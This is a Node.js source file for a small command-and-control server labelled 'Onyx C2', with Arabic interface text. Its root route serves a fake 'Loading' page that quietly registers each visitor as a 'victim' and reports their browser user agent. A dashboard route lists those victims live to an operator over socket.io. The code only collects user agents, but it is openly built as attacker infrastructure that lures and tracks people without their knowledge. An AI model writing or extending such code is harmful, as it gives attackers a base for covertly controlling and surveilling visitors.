const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const PORT = process.env.PORT || 3000;
let victims = {};

app.get('/dashboard', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <title>Onyx Control Panel</title>
        <style>
            body { background: #0b0f19; color: #f8fafc; font-family: monospace; padding: 20px; }
            h1 { color: #38bdf8; }
            .card { background: #1e293b; border: 1px solid #334155; padding: 15px; margin-bottom: 15px; border-radius: 8px; }
            input, button { background: #334155; color: white; border: 1px solid #475569; padding: 8px; border-radius: 4px; }
            button { cursor: pointer; background: #0284c7; }
        </style>
    </head>
    <body>
        <h1>لوحة التحكم - Onyx C2</h1>
        <div id="list">جاري البحث عن الضحايا...</div>
        <script src="/socket.io/socket.io.js"></script>
        <script>
            const socket = io();
            socket.emit('admin-join');
            socket.on('refresh-list', (data) => {
                const list = document.getElementById('list');
                const keys = Object.keys(data);
                if(keys.length === 0) {
                    list.innerHTML = 'لا توجد أجهزة متصلة حالياً...';
                    return;
                }
                list.innerHTML = '';
                keys.forEach(id => {
                    list.innerHTML += \`<div class="card">معرف الجهاز: \${id}<br>البيئة: \${data[id].ua}</div>\`;
                });
            });
        </script>
    </body>
    </html>
    `);
});

app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="ar">
    <head><meta charset="UTF-8"><title>Loading</title></head>
    <body>
        <h2>جاري التحميل...</h2>
        <script src="/socket.io/socket.io.js"></script>
        <script>
            const socket = io();
            socket.emit('victim-join', { ua: navigator.userAgent });
        </script>
    </body>
    </html>
    `);
});

io.on('connection', (socket) => {
    socket.on('victim-join', (data) => {
        victims[socket.id] = data;
        io.to('admins').emit('refresh-list', victims);
    });

    socket.on('admin-join', () => {
        socket.join('admins');
        socket.emit('refresh-list', victims);
    });

    socket.on('disconnect', () => {
        if(victims[socket.id]) {
            delete victims[socket.id];
            io.to('admins').emit('refresh-list', victims);
        }
    });
});

server.listen(PORT, () => {
    console.log('Server is running on port ' + PORT);
});
